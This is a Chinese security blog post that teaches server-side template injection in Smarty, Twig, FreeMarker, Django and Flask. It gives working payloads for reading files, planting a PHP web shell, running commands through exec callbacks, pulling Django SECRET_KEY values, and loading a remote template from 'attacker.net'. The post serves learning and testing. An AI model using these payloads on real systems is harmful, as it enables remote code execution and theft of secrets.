<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ssti注入续()"><meta name="keywords" content=""><meta name="author" content="vague huang"><meta name="copyright" content="vague huang"><title>ssti注入续() | Tlife</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.1.</span> <span class="toc-text">模板注入攻击步骤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">2.</span> <span class="toc-text">常见模板引擎</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84"><span class="toc-number">2.0.1.</span> <span class="toc-text">1.php 常用的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Java-%E5%B8%B8%E7%94%A8%E7%9A%84"><span class="toc-number">2.0.2.</span> <span class="toc-text">2.Java 常用的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Python-%E5%B8%B8%E7%94%A8%E7%9A%84"><span class="toc-number">2.0.3.</span> <span class="toc-text">3.Python 常用的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%B3%A8%E6%84%8F%EF%BC%9A"><span class="toc-number">2.0.4.</span> <span class="toc-text">4.注意：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.1.</span> <span class="toc-text">php实例:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.2.</span> <span class="toc-text">python实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.3.</span> <span class="toc-text">java实例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">检测方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%90%91"><span class="toc-number">4.</span> <span class="toc-text">攻击方向</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">4.1.</span> <span class="toc-text">0X06 攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%94%BB%E5%87%BB%E6%96%B9%E5%90%91%EF%BC%9A"><span class="toc-number">4.1.1.</span> <span class="toc-text">1.攻击方向：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">4.1.2.</span> <span class="toc-text">2.攻击方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E6%A8%A1%E6%9D%BF%E6%9C%AC%E8%BA%AB%E7%9A%84%E7%89%B9%E6%80%A7%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">1.利用模板本身的特性进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Smarty"><span class="toc-number">4.1.2.1.1.</span> <span class="toc-text">1.Smarty</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-Twig"><span class="toc-number">4.1.2.1.2.</span> <span class="toc-text">2.Twig</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-freeMarker"><span class="toc-number">4.1.2.1.3.</span> <span class="toc-text">3.freeMarker</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E6%A1%86%E6%9E%B6%E6%9C%AC%E8%BA%AB%E7%9A%84%E7%89%B9%E6%80%A7%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.2.2.</span> <span class="toc-text">2.利用框架本身的特性进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Django"><span class="toc-number">4.1.2.2.1.</span> <span class="toc-text">1.Django</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-Flask-Jinja2"><span class="toc-number">4.1.2.2.2.</span> <span class="toc-text">2.Flask&#x2F;Jinja2</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-Tornado"><span class="toc-number">4.1.2.2.3.</span> <span class="toc-text">3.Tornado</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E6%A8%A1%E8%AF%AD%E8%A8%80%E6%9C%AC%E8%BA%AB%E7%9A%84%E7%89%B9%E6%80%A7%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.2.3.</span> <span class="toc-text">2.利用模语言本身的特性进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Python"><span class="toc-number">4.1.2.3.1.</span> <span class="toc-text">1.Python</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-JAVA"><span class="toc-number">4.1.2.3.2.</span> <span class="toc-text">2.JAVA</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">vague huang</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">126</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Tlife</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">ssti注入续()</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-01</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前理解的ssti注入一直以为是python才有的，后来发现并不是的，应该说是服务器端模板注入，<strong>凡是使用模板的地方都有可能出现ssti注入</strong>！！<a id="more"></a></p>
<h2 id="模板注入攻击步骤"><a href="#模板注入攻击步骤" class="headerlink" title="模板注入攻击步骤"></a>模板注入攻击步骤</h2><p>确定模板类型——&gt;选择对应攻击语句</p>
<h1 id="常见模板引擎"><a href="#常见模板引擎" class="headerlink" title="常见模板引擎"></a>常见模板引擎</h1><h3 id="1-php-常用的"><a href="#1-php-常用的" class="headerlink" title="1.php 常用的"></a><strong>1.php 常用的</strong></h3><p><strong>Smarty</strong></p>
<p>Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛</p>
<p><strong>Twig</strong></p>
<p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p>
<p><strong>Blade</strong></p>
<p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p>
<p>和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何额外负担。</p>
<h3 id="2-Java-常用的"><a href="#2-Java-常用的" class="headerlink" title="2.Java 常用的"></a><strong>2.Java 常用的</strong></h3><p><strong>JSP</strong></p>
<p>这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典</p>
<p><strong>FreeMarker</strong></p>
<p>FreeMarker是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
<p><strong>Velocity</strong></p>
<p>Velocity作为历史悠久的模板引擎不单单可以替代JSP作为Java Web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。</p>
<h3 id="3-Python-常用的"><a href="#3-Python-常用的" class="headerlink" title="3.Python 常用的"></a><strong>3.Python 常用的</strong></h3><p><strong>Jinja2</strong></p>
<p>flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎</p>
<p><strong>django</strong></p>
<p>django 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了</p>
<p><strong>tornado</strong></p>
<p>tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发</p>
<h3 id="4-注意："><a href="#4-注意：" class="headerlink" title="4.注意："></a><strong>4.注意：</strong></h3><p>同一种语言不同的模板引擎支持的语法虽然很像，但是还是有略微的差异的，比如</p>
<p>tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>中执行,但是 django 的模板引擎相对于tornado 来说就相对难用一些</p>
<h2 id="php实例"><a href="#php实例" class="headerlink" title="php实例:"></a>php实例:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).‘/../lib/Twig/Autoloader.php‘;</span><br><span class="line">Twig_Autoloader::register(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[‘name‘]&#125;</span>&quot;</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>

<h2 id="python实例"><a href="#python实例" class="headerlink" title="python实例"></a>python实例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(e):</span><br><span class="line">    template &#x3D; &#39;&#39;&#39;&#123;%% extends &quot;layout.html&quot; %%&#125;</span><br><span class="line">&#123;%% block body %%&#125;</span><br><span class="line">    &lt;div class&#x3D;&quot;center-content error&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&#123;%% endblock %%&#125;</span><br><span class="line">&#39;&#39;&#39; % (request.url)</span><br><span class="line">    return render_template_string(template), 404</span><br></pre></td></tr></table></figure>

<h2 id="java实例"><a href="#java实例" class="headerlink" title="java实例"></a>java实例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; </span><br><span class="line">$&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure>

<h1 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h1><p>这里提供一个大牛写的 SSTI 的检测工具 <a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br>或者64验证是否会被运算输出</p>
<h1 id="攻击方向"><a href="#攻击方向" class="headerlink" title="攻击方向"></a>攻击方向</h1><h2 id="0X06-攻击思路"><a href="#0X06-攻击思路" class="headerlink" title="0X06 攻击思路"></a><strong>0X06 攻击思路</strong></h2><h3 id="1-攻击方向："><a href="#1-攻击方向：" class="headerlink" title="1.攻击方向："></a><strong>1.攻击方向：</strong></h3><p>找到模板注入主要从三个方向进行攻击</p>
<p>(1)模板本身<br>(2)框架本身<br>(3)语言本身<br>(4)应用本身</p>
<h3 id="2-攻击方法："><a href="#2-攻击方法：" class="headerlink" title="2.攻击方法："></a><strong>2.攻击方法：</strong></h3><p>我们知道 SSTI 能够造成很多种危害，包括 敏感信息泄露、RCE、GetShell 等，关键就在于如何才能利用这个注入点执行我们想执行的代码，那么我们寻找利用点的范围实际上就是在我们上面的四个地方，一个是模板本身支持的语法、内置变量、属性、函数，还有就是纯粹框架的全局变量、属性、函数，然后我们考虑语言本身的特性，比如 面向对象的内省机制，最最最后我们无能为力的时候才考虑怎么寻找应用定义的一些东西，因为这个是几乎没有文档的，是开发者的自行设计，一般需要拿到应用的源码才能考虑，于是我将其放在最后一个</p>
<blockquote>
<p><strong>注意：</strong></p>
<p>在这种面向对象的语言中，获取父类这种思想要贯穿始终，理论基础就是 Python 的魔法方法 PHP 的自省 JAVA 的反射 机制</p>
</blockquote>
<h4 id="1-利用模板本身的特性进行攻击"><a href="#1-利用模板本身的特性进行攻击" class="headerlink" title="1.利用模板本身的特性进行攻击"></a><strong>1.利用模板本身的特性进行攻击</strong></h4><h5 id="1-Smarty"><a href="#1-Smarty" class="headerlink" title="1.Smarty"></a><strong>1.Smarty</strong></h5><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p>
<p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的好用的方法</p>
<p>比如：<a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385">getStreamVariable()</a></p>
<p>github 中明确指出，这个方法可以获取传入变量的流（说人话就是读文件）</p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;loginuid&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>再比如：<a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a></p>
<p>有了上面的读文件当然要找一个写文件的了，这个类中有一个writeFile方法</p>
<p><strong>函数原型：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public function writeFile($_filepath, $_contents, Smarty $smarty)</span><br></pre></td></tr></table></figure>

<p>但是这个第三个参数是一个 Smarty 类型，后来找到了 <code>self::clearConfig()</code></p>
<p><strong>函数原型：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function clearConfig($varname &#x3D; null)</span><br><span class="line">&#123;</span><br><span class="line">    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>能写文件对攻击者真的是太有利了，一般不出意外能直接 getshell</p>
<p><strong>payload：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-Twig"><a href="#2-Twig" class="headerlink" title="2.Twig"></a><strong>2.Twig</strong></h5><p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了，但是 通过<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a>的查询</p>
<p><strong>如下图所示：</strong></p>
<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_self.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_self.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env</p>
<p><strong>如下图所示：</strong></p>
<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_env.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_env.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来我找到了Twig 的源码中的 environment.php</p>
<p><strong>如下图所示：</strong></p>
<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_setCache.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_setCache.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：</p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp:&#x2F;&#x2F;attacker.net:2121&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>但是新的问题出现了</strong>，allow_url_include 一般是不打开的，没法包含远程文件，没关系还有个调用过滤器的函数 <a target="_blank" rel="noopener" href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p>
<p>这个函数中调用了一个 call_user_function 方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function getFilter($name)</span><br><span class="line">&#123;</span><br><span class="line">        [snip]</span><br><span class="line">        foreach ($this-&gt;filterCallbacks as $callback) &#123;</span><br><span class="line">        if (false !&#x3D;&#x3D; $filter &#x3D; call_user_func($callback, $name)) &#123;&#x2F;&#x2F;注意这行</span><br><span class="line">            return $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function registerUndefinedFilterCallback($callable)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;filterCallbacks[] &#x3D; $callable;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>我们只要把exec() 作为回调函数传进去就能实现命令执行了</p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-freeMarker"><a href="#3-freeMarker" class="headerlink" title="3.freeMarker"></a><strong>3.freeMarker</strong></h5><p>这个模板主要用于 java ，在上面我举例 java 的 SSTI 的时候我已经简答的分析过这个的一个 payload，我希望读者也能按照 查找文档，查看框架源码，等方式寻找这个 payload 的思路来源</p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-利用框架本身的特性进行攻击"><a href="#2-利用框架本身的特性进行攻击" class="headerlink" title="2.利用框架本身的特性进行攻击"></a><strong>2.利用框架本身的特性进行攻击</strong></h4><p>因为这里面的摸吧模板似乎都是内置于框架内的，于是我就将其放在利用框架这一节</p>
<h5 id="1-Django"><a href="#1-Django" class="headerlink" title="1.Django"></a><strong>1.Django</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def view(request, *args, **kwargs):</span><br><span class="line">    template &#x3D; &#39;Hello &#123;user&#125;, This is your email: &#39; + request.GET.get(&#39;email&#39;)</span><br><span class="line">    return HttpResponse(template.format(user&#x3D;request.user))</span><br></pre></td></tr></table></figure>

<p>注入点很明显就是 email，但是如果我们的能力已经被限制的很死，很难执行命令，但又想获取和 User 有关的配置信息的话，我么怎么办？</p>
<p>可以发现我们现在拿到的只有有一个 和user 有关的变量，那就是 request user ，那我们的思路是什么？</p>
<p>p牛在自己的博客中分享了这个思路，我把它引用过来：</p>
<blockquote>
<p>Django是一个庞大的框架，其数据库关系错综复杂，我们其实是可以通过属性之间的关系去一点点挖掘敏感信息。但Django仅仅是一个框架，在没有目标源码的情况下很难去挖掘信息，所以我的思路就是：去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项</p>
</blockquote>
<p>什么意思，简单地说就是我们在没有应用源码的情况下要学会去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用，然后一步一步的靠近我们的目标</p>
<p>后来我们发现，经过翻找，我发现Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p>
<p><strong>如下图：</strong></p>
<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/django-seetings.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/django-seetings.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>所以，思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?email&#x3D;&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2-Flask-Jinja2"><a href="#2-Flask-Jinja2" class="headerlink" title="2.Flask/Jinja2"></a><strong>2.Flask/Jinja2</strong></h5><p>config 是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。虽然config是一个类字典对象，但是通过查阅文档可以发现 config 有很多神奇的方法：from_envvar, from_object, from_pyfile, 以及root_path。</p>
<p><strong>如图所示：</strong></p>
<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/flask-config.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/flask-config.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>这里我们利用 from_pyfile 和 from_object 来命令执行，下面是这两个函数的源代码（为了阅读清晰，注释我删除了）</p>
<p><strong>源码：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">def from_pyfile(self, filename, silent&#x3D;False):</span><br><span class="line"></span><br><span class="line">    filename &#x3D; os.path.join(self.root_path, filename)</span><br><span class="line">    d &#x3D; types.ModuleType(&#39;config&#39;)</span><br><span class="line">    d.__file__ &#x3D; filename</span><br><span class="line">    try:</span><br><span class="line">        with open(filename) as config_file:</span><br><span class="line">            exec(compile(config_file.read(), filename, &#39;exec&#39;), d.__dict__)</span><br><span class="line">    except IOError as e:</span><br><span class="line">        if silent and e.errno in (errno.ENOENT, errno.EISDIR):</span><br><span class="line">            return False</span><br><span class="line">        e.strerror &#x3D; &#39;Unable to load configuration file (%s)&#39; % e.strerror</span><br><span class="line">        raise</span><br><span class="line">    self.from_object(d)</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def from_object(self, obj):</span><br><span class="line"></span><br><span class="line">    if isinstance(obj, string_types):</span><br><span class="line">        obj &#x3D; import_string(obj)</span><br><span class="line">    for key in dir(obj):</span><br><span class="line">        if key.isupper():</span><br><span class="line">            self[key] &#x3D; getattr(obj, key)</span><br></pre></td></tr></table></figure>

<p><strong>简单的解释一下这个方法：</strong></p>
<p>这个方法将传入的文件使用 compile() 这个python 的内置方法将其编译成字节码(.pyc),并放到 exec() 里面去执行，注意最后一个参数 <code>d.__dict__</code>翻阅文档发现，这个参数的含义是指定 exec 执行的上下文，</p>
<p><strong>如图所示：</strong></p>
<p>[![此处输入图片的描述](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python">https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python</a> exec.png)](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python">https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python</a> exec.png)此处输入图片的描述</p>
<p>我们简单的模拟一下看一下效果</p>
<p><strong>如图所示:</strong></p>
<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/d.__dict__.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/d.__dict__.png" alt="此处输入图片的描述"></a>此处输入图片的描述<br><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/d.__dict__2.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/d.__dict__2.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
